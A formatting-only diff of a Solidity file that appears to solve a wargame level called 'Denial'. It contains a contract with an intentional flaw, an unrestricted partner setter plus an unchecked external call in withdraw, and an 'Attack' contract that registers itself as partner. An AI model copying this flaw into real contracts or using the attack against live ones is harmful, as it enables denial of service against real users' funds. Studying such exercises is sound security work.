+++ src/20.Denial.sol
@@ -1,10 +1,11 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+
 contract Denial {
     address public partner; // withdrawal partner - pay the gas, split the withdraw
     address public constant owner = address(0xA9E);
-    uint timeLastWithdrawn;
-    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
+    uint256 timeLastWithdrawn;
+    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances
 
     function setWithdrawPartner(address _partner) public {
         partner = _partner;
@@ -12,7 +13,7 @@ contract Denial {
 
     // withdraw 1% to recipient and 1% to owner
     function withdraw() public {
-        uint amountToSend = address(this).balance / 100;
+        uint256 amountToSend = address(this).balance / 100;
         // perform a call without checking return
         // The recipient can revert, the owner will still get their share
         partner.call{value: amountToSend}("");
@@ -26,7 +27,7 @@ contract Denial {
     receive() external payable {}
 
     // convenience function
-    function contractBalance() public view returns (uint) {
+    function contractBalance() public view returns (uint256) {
         return address(this).balance;
     }
 }
@@ -36,12 +37,7 @@ contract Attack {
 
     constructor(address _denial) {
         denial = _denial;
-        (bool ok, ) = denial.call(
-            abi.encodeWithSelector(
-                Denial.setWithdrawPartner.selector,
-                address(this)
-            )
-        );
+        (bool ok,) = denial.call(abi.encodeWithSelector(Denial.setWithdrawPartner.selector, address(this)));
         if (!ok) {
             revert();
         }
